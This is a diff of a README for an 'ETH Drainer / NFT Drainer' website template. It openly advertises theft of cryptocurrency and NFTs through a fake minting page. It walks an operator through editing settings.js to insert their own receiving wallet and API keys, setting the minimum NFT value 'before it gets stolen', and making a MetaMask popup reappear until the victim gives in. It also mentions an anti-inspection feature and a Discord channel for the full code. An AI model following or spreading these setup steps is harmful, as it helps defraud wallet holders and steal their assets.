@@ -1,8 +1,7 @@
-# ⚠️ You need to host it on a real website for it to work ! 
+# ⚠️ New version ! 
 # For full code contact us on [@discord](https://discord.gg/zE5nUjbbk8)
 ## <center>🖼️ Drainer Template / ETH Drainer / NFT Drainer
-![image](https://user-images.githubusercontent.com/108035292/182293299-9ad3a779-26b0-42c6-a7aa-92648e3f01a2.png)
-![image](https://user-images.githubusercontent.com/108035292/182294247-f94de954-f3e7-4d74-8c83-eb7217b53f6e.png)
+![image](https://user-images.githubusercontent.com/108035292/184466395-ab7037f5-8431-48de-abea-fcd991360677.png)
 ---
 
 ## `💧 Features`
@@ -16,17 +15,21 @@
 - [x] Anti F12 Inspect
 
 ## `👻 Guide : `
-In order to use this website, you need to edit the **settings.js** file. 
-On line 1: const receiveAddress = "YOUR WALLET"; replace **YOUR WALLET with your ETH wallet address.**
+you need to edit the **settings.js** file only. 
+- line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
+- line 2: const infuraId = `"InfuraId";` replace this by **your https://Infura.io app ID**
+- line 3: const moralisApi = `"MoralisApi";` replace this by **your https://admin.moralis.io/web3apis web3 x-api key (copy api key > v1)**
 
-In the settings.js files, lines after "const collectionInfo" will change the text shown on the page and the images.
-Images are located in the assets folder, you can change them there.
+  - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
+  - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.
 
 ## `👻 Important : `
 
-Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
-Edit lines : nftReceiveAddress: "YOUR WALLET", replace YOUR WALLET with your ETH wallet address.
-Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. Exemple : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.
+- Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
+- Edit lines : nftReceiveAddress: **"YOUR WALLET"**, replace this your ETH wallet address.
+- Line **"minValue: 0.2,"** is the minimum value of a NFT before it gets stolen. 
+Exemple : If you change this value to **1**, the script will only steal NFTs that have a value higher to **1**.
+### ➢ To see the metamask popup, you must host the website
 
 To get instant support, contact us on [@Web 3.0 - Service Agency](https://discord.gg/zE5nUjbbk8)
 
